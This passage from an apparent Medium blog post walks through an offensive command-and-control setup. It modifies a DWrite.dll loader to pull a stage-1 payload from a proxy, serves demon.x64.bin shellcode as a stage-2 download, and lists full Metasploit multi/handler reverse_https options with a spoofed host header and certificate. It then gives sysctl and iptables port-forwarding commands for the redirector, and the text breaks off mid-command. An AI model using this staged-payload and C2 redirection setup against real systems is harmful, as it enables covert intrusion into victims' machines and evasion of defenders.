src="https://miro.medium.com/v2/resize:fit:1000/1*mw198RZs3nlfhzttcJ9UYA.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="befe" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">We also need to change our DWrite.dll so that it grabs the iloveblogs.bin file from our proxy server public IP:</p></div></div><div class="qk"><div class="ac ci"><div class="mi ql mj qm mk qn cm qo cn qp cp bi"><figure class="qt qu qv qw qx qk qy qz paragraph-image"><div role="button" tabindex="0" class="ra rb fr rc bi rd"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="qq qr rf"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*qY-VBzICyndDUoE6PTmmrQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*qY-VBzICyndDUoE6PTmmrQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*qY-VBzICyndDUoE6PTmmrQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*qY-VBzICyndDUoE6PTmmrQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*qY-VBzICyndDUoE6PTmmrQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*qY-VBzICyndDUoE6PTmmrQ.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*qY-VBzICyndDUoE6PTmmrQ.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*qY-VBzICyndDUoE6PTmmrQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*qY-VBzICyndDUoE6PTmmrQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*qY-VBzICyndDUoE6PTmmrQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*qY-VBzICyndDUoE6PTmmrQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*qY-VBzICyndDUoE6PTmmrQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*qY-VBzICyndDUoE6PTmmrQ.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*qY-VBzICyndDUoE6PTmmrQ.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn re c" width="1000" height="139" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*qY-VBzICyndDUoE6PTmmrQ.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="fca3" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph=""><strong class="ni hm">Step 2) </strong>Victim executes the stage 1 payload (iloveblogs.bin) → downloads the stage 2 payload from port 8443 (demon.x64.bin) on proxy server. Behind the scenes our demon.x64.bin shellcode is actually loaded from our C&amp;C server and sent to the proxy.</p><p id="7b86" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Here’s the options for the multi/listener on the C&amp;C server:</p><ul class=""><li id="db0e" class="ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe bl" data-selectable-paragraph="">use multi/handler</li><li id="5fcf" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">set payload windows/x64/custom/reverse_https</li><li id="4f8b" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">set exitfunc thread</li><li id="c517" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">set lhost &lt;ATTACKER LOCAL IP&gt; # 192.168.0.64 in my case</li><li id="1c85" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">set lport 50001 # port forward from 8443 on proxy to 50001 on C&amp;C</li><li id="d9f7" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">set luri blog.html</li><li id="3e73" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">set HttpServerName Blogger</li><li id="cd16" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">set shellcode_file demon.x64.bin</li><li id="8e3a" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">set exitonsession false</li><li id="11fc" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">set HttpHostHeader <a class="ah rg" href="http://www.factbook.com/" rel="noopener ugc nofollow" target="_blank">www.factbook.com</a></li><li id="3793" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">set HandlerSSLCert <a class="ah rg" href="http://www.google.com.pem/" rel="noopener ugc nofollow" target="_blank">www.google.com.pem</a></li><li id="d29d" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">run</li></ul></div></div><div class="qk"><div class="ac ci"><div class="mi ql mj qm mk qn cm qo cn qp cp bi"><figure class="qt qu qv qw qx qk qy qz paragraph-image"><div role="button" tabindex="0" class="ra rb fr rc bi rd"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="qq qr rh"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*eBDrFggv63_CNI0p3yqYRA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*eBDrFggv63_CNI0p3yqYRA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*eBDrFggv63_CNI0p3yqYRA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*eBDrFggv63_CNI0p3yqYRA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*eBDrFggv63_CNI0p3yqYRA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*eBDrFggv63_CNI0p3yqYRA.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*eBDrFggv63_CNI0p3yqYRA.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*eBDrFggv63_CNI0p3yqYRA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*eBDrFggv63_CNI0p3yqYRA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*eBDrFggv63_CNI0p3yqYRA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*eBDrFggv63_CNI0p3yqYRA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*eBDrFggv63_CNI0p3yqYRA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*eBDrFggv63_CNI0p3yqYRA.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*eBDrFggv63_CNI0p3yqYRA.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn re c" width="1000" height="67" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*eBDrFggv63_CNI0p3yqYRA.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="36ad" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph=""><strong class="ni hm">Step 3) </strong>Stage 2 connection executed on victim and C2 established to port 443 (Havoc C2) proxy server. Behind the scene our Havoc C2 session is established with our C&amp;C server on port 50002.</p><p id="9d64" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">We need to change our listener (which creates demon.x64.bin) to the public IP of our proxy server over port 443, but connect to our C&amp;C server private IP on port 50002.</p><figure class="qt qu qv qw qx qk qq qr paragraph-image"><div class="qq qr ri"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*B10oLS80f7l6dpE28bq6-A.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*B10oLS80f7l6dpE28bq6-A.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*B10oLS80f7l6dpE28bq6-A.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*B10oLS80f7l6dpE28bq6-A.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*B10oLS80f7l6dpE28bq6-A.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*B10oLS80f7l6dpE28bq6-A.png 1100w, https://miro.medium.com/v2/resize:fit:1106/format:webp/1*B10oLS80f7l6dpE28bq6-A.png 1106w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 553px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*B10oLS80f7l6dpE28bq6-A.png 640w, https://miro.medium.com/v2/resize:fit:720/1*B10oLS80f7l6dpE28bq6-A.png 720w, https://miro.medium.com/v2/resize:fit:750/1*B10oLS80f7l6dpE28bq6-A.png 750w, https://miro.medium.com/v2/resize:fit:786/1*B10oLS80f7l6dpE28bq6-A.png 786w, https://miro.medium.com/v2/resize:fit:828/1*B10oLS80f7l6dpE28bq6-A.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*B10oLS80f7l6dpE28bq6-A.png 1100w, https://miro.medium.com/v2/resize:fit:1106/1*B10oLS80f7l6dpE28bq6-A.png 1106w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 553px"><img alt="" class="bi mn re c" width="553" height="846" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:553/1*B10oLS80f7l6dpE28bq6-A.png"></picture></div><figcaption class="rj fm rk qq qr rl rm bg b bh ab eb" data-selectable-paragraph="">Havoc C2 Listener</figcaption></figure><figure class="qt qu qv qw qx qk qq qr paragraph-image"><div class="qq qr rn"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*pYekKYQN8C0xp6hBtfQxJA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*pYekKYQN8C0xp6hBtfQxJA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*pYekKYQN8C0xp6hBtfQxJA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*pYekKYQN8C0xp6hBtfQxJA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*pYekKYQN8C0xp6hBtfQxJA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*pYekKYQN8C0xp6hBtfQxJA.png 1100w, https://miro.medium.com/v2/resize:fit:1102/format:webp/1*pYekKYQN8C0xp6hBtfQxJA.png 1102w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 551px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*pYekKYQN8C0xp6hBtfQxJA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*pYekKYQN8C0xp6hBtfQxJA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*pYekKYQN8C0xp6hBtfQxJA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*pYekKYQN8C0xp6hBtfQxJA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*pYekKYQN8C0xp6hBtfQxJA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*pYekKYQN8C0xp6hBtfQxJA.png 1100w, https://miro.medium.com/v2/resize:fit:1102/1*pYekKYQN8C0xp6hBtfQxJA.png 1102w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 551px"><img alt="" class="bi mn re c" width="551" height="724" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:551/1*pYekKYQN8C0xp6hBtfQxJA.png"></picture></div><figcaption class="rj fm rk qq qr rl rm bg b bh ab eb" data-selectable-paragraph="">Havoc C2 Payload</figcaption></figure><p id="a0c5" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">This will create our demon.x64.bin file which will be served up by the Metasploit multi/listener on our C&amp;C server and grabbed by our proxy server for the victim.</p><h3 id="f894" class="ok ol hl bg om on oo ef op oq or eh os np ot ou ov nt ow ox oy nx oz pa pb pc bl" data-selectable-paragraph=""><strong class="an">Port Forwarding</strong></h3><p id="c51a" class="pw-post-body-paragraph ng nh hl ni b ij pd nk nl im pe nn no np pf nr ns nt pg nv nw nx ph nz oa ob he bl" data-selectable-paragraph="">Here’s how we can forward everything from our proxy server linux droplet to our C&amp;C server bidirectionally. Replace the C&amp;C IP address below with your own.</p><ul class=""><li id="2c1d" class="ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe bl" data-selectable-paragraph="">Proxy Server Public Facing Interface: eth0</li><li id="0489" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">C&amp;C Server Public IP Address: 2.2.2.2</li></ul></div></div><div class="qk"><div class="ac ci"><div class="mi ql mj qm mk qn cm qo cn qp cp bi"><figure class="qt qu qv qw qx qk qy qz paragraph-image"><div role="button" tabindex="0" class="ra rb fr rc bi rd"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="qq qr ro"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*QsPILeaMgd2dPeAVicIO7w.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*QsPILeaMgd2dPeAVicIO7w.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*QsPILeaMgd2dPeAVicIO7w.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*QsPILeaMgd2dPeAVicIO7w.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*QsPILeaMgd2dPeAVicIO7w.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*QsPILeaMgd2dPeAVicIO7w.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*QsPILeaMgd2dPeAVicIO7w.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*QsPILeaMgd2dPeAVicIO7w.png 640w, https://miro.medium.com/v2/resize:fit:720/1*QsPILeaMgd2dPeAVicIO7w.png 720w, https://miro.medium.com/v2/resize:fit:750/1*QsPILeaMgd2dPeAVicIO7w.png 750w, https://miro.medium.com/v2/resize:fit:786/1*QsPILeaMgd2dPeAVicIO7w.png 786w, https://miro.medium.com/v2/resize:fit:828/1*QsPILeaMgd2dPeAVicIO7w.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*QsPILeaMgd2dPeAVicIO7w.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*QsPILeaMgd2dPeAVicIO7w.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn re c" width="1000" height="305" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*QsPILeaMgd2dPeAVicIO7w.png"></picture></div></div><figcaption class="rj fm rk qq qr rl rm bg b bh ab eb" data-selectable-paragraph="">Proxy server addresses</figcaption></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="3540" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Run the following commands on your proxy server droplet:</p><div class="wb ux wc wd ac r cv"><div class="we wf wg wh wi m fm"><h2 class="wj b wk wl wm wn wo">Get Sam Rothlisberger’s stories in&nbsp;your&nbsp;inbox</h2></div><div class="cs m fm"><p class="bg b bh ab eb">Join Medium for free to get updates from&nbsp;this&nbsp;writer.</p></div><div class="ws sx wt wu sw wv ac"><span class="bg b bh ab bl"><div class="ww ac cv"><div class="ac ww fj fi bq wx wy de mb wz xa xb xc xd xe xf"><input class="xg al aj an xh xi gd ln bm xj bi" placeholder="Enter your email" type="text" value=""></div></div></span><div class="i l tn cb"><div class="wp wq wr"><button class="bg b bh ab xk sc xl xm xn xo vh fc fd xp xq xr fh fi fj fk bn fl fm">Subscribe</button></div></div><div class="bi k j e"><button class="bg b bh ab xk sc xl xm xn xo vh fc fd xp xq xr fh bi fi fj fk bn fl fm">Subscribe</button></div></div><div class="py m"><div id="g-recaptcha"></div></div></div><p id="11da" class="pw-post-body-paragraph ng nh hl ni b ij nk nl im nn no np nr ns nt nv nw nx nz oa wd ob he bl" data-selectable-paragraph=""><strong class="ni hm">Turn port forwarding on</strong></p><blockquote class="qg qh qi"><p id="faef" class="ng nh qj ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">sudo nano /etc/sysctl.conf</p><p id="63a2" class="ng nh qj ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">uncomment this line : net.ipv4.ip_forward=1</p><p id="ca06" class="ng nh qj ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">sudo sysctl -p</p><p id="a280" class="ng nh qj ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">sudo sysctl — system</p></blockquote></div></div><div class="qk"><div class="ac ci"><div class="mi ql mj qm mk qn cm qo cn qp cp bi"><figure class="qt qu qv qw qx qk qy qz paragraph-image"><div role="button" tabindex="0" class="ra rb fr rc bi rd"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="qq qr rp"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*JrVOlqSmn5eNq3-tl10QrA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*JrVOlqSmn5eNq3-tl10QrA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*JrVOlqSmn5eNq3-tl10QrA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*JrVOlqSmn5eNq3-tl10QrA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*JrVOlqSmn5eNq3-tl10QrA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*JrVOlqSmn5eNq3-tl10QrA.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*JrVOlqSmn5eNq3-tl10QrA.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*JrVOlqSmn5eNq3-tl10QrA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*JrVOlqSmn5eNq3-tl10QrA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*JrVOlqSmn5eNq3-tl10QrA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*JrVOlqSmn5eNq3-tl10QrA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*JrVOlqSmn5eNq3-tl10QrA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*JrVOlqSmn5eNq3-tl10QrA.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*JrVOlqSmn5eNq3-tl10QrA.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn re c" width="1000" height="306" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*JrVOlqSmn5eNq3-tl10QrA.png"></picture></div></div></figure><figure class="ma qk qy qz paragraph-image"><div role="button" tabindex="0" class="ra rb fr rc bi rd"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="qq qr rp"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Vg3bSJQsnyn682N11Fc_3w.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Vg3bSJQsnyn682N11Fc_3w.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Vg3bSJQsnyn682N11Fc_3w.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Vg3bSJQsnyn682N11Fc_3w.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Vg3bSJQsnyn682N11Fc_3w.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Vg3bSJQsnyn682N11Fc_3w.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Vg3bSJQsnyn682N11Fc_3w.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*Vg3bSJQsnyn682N11Fc_3w.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Vg3bSJQsnyn682N11Fc_3w.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Vg3bSJQsnyn682N11Fc_3w.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Vg3bSJQsnyn682N11Fc_3w.png 786w, https://miro.medium.com/v2/resize:fit:828/1*Vg3bSJQsnyn682N11Fc_3w.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Vg3bSJQsnyn682N11Fc_3w.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*Vg3bSJQsnyn682N11Fc_3w.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn re c" width="1000" height="265" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*Vg3bSJQsnyn682N11Fc_3w.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="d52c" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph=""><strong class="ni hm">Accept connections from public facing interface on ports 80, 8443, and 443 for new and established connections</strong></p><blockquote class="qg qh qi"><p id="d2af" class="ng nh qj ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">sudo iptables -A FORWARD -i eth0 -o eth0 -p tcp — syn — dport 80 -m conntrack — ctstate NEW -j ACCEPT</p><p id="bbab" class="ng nh qj ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">sudo iptables -A FORWARD -i eth0 -o eth0 -p tcp — syn — dport 8443 -m conntrack — ctstate NEW 